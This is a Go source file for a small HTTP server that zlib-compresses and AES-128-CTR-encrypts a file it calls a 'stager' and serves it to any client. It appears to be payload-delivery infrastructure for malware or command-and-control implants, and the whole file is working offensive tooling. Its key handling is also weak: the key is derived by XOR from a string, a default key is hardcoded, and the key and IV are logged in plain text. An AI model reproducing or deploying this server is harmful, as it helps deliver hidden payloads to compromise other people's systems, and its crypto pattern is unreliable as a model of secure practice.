package main

import (
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
)

// encryptData encrypts the given data using the AES-128-CTR algorithm and the provided key.
// The IV is prepended to the encrypted data.
func encryptData(data []byte, key []byte) []byte {
	if len(key) != 16 {
		log.Fatalf("Key length must be 16 bytes for AES-128-CTR")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		log.Fatalf("Failed to create AES cipher: %v", err)
	}

	// Generate a random IV
	iv := make([]byte, aes.BlockSize)
	if _, err := rand.Read(iv); err != nil {
		log.Fatalf("Failed to generate IV: %v", err)
	}
	log.Printf("Generated IV: %s", hex.EncodeToString(iv))

	// Use CTR mode for encryption
	stream := cipher.NewCTR(block, iv)

	encrypted := make([]byte, len(data))
	stream.XORKeyStream(encrypted, data)

	// Prepend the IV to the encrypted data
	return append(iv, encrypted...)
}

// compressData compresses the given data using zlib.
func compressData(data []byte) []byte {
	var b bytes.Buffer
	w := zlib.NewWriter(&b)
	_, err := w.Write(data)
	if err != nil {
		log.Fatalf("Failed to compress data: %v", err)
	}
	w.Close()
	return b.Bytes()
}

// deriveKeyFromString derives a 16-byte key from a string.
// The key is derived by XORing the characters of the string.
func deriveKeyFromString(str string) []byte {
	key := make([]uint32, 4)
	for i := 0; i < 4; i++ {
		for j := 0; j < len(str)/4; j++ {
			key[i] ^= uint32(str[i+j*4]) << (j % 4 * 8)
		}
	}
	keyBytes := make([]byte, 16)
	for i, v := range key {
		binary.LittleEndian.PutUint32(keyBytes[i*4:], v)
	}
	log.Printf("Derived key: %08x %08x %08x %08x\n", key[0], key[1], key[2], key[3])
	return keyBytes[:16] // Ensure the key is 16 bytes long
}

// ServeHTTPStager serves the encrypted stager file over HTTP.
func ServeHTTPStager(stager_enc []byte, port string) {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("Received request from %s", r.RemoteAddr)
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(stager_enc)))
		w.Write(stager_enc)
		log.Printf("Served encrypted stager to %s", r.RemoteAddr)
	})
	log.Printf("Starting HTTP server on port %s", port)
	http.ListenAndServe(fmt.Sprintf(":%s", port), nil)
}

func main() {
	stagerPath := flag.String("stager", "", "path to the stager file to serve")
	port := flag.String("port", "8080", "port to serve the stager file on")
	keyStr := flag.String("key", "my_secret_key", "key to encrypt the stager file")
	flag.Parse()

	if *stagerPath == "" {
		log.Fatal("stager file path is required")
	}

	stager, err := os.ReadFile(*stagerPath)
	if err != nil {
		log.Fatalf("Failed to read stager file: %v", err)
	}

	key := deriveKeyFromString(*keyStr)

	compressedStager := compressData(stager)
	encryptedStager := encryptData(compressedStager, key)

	log.Printf("Serving encrypted stager file on port %s", *port)
	ServeHTTPStager(encryptedStager, *port)
}
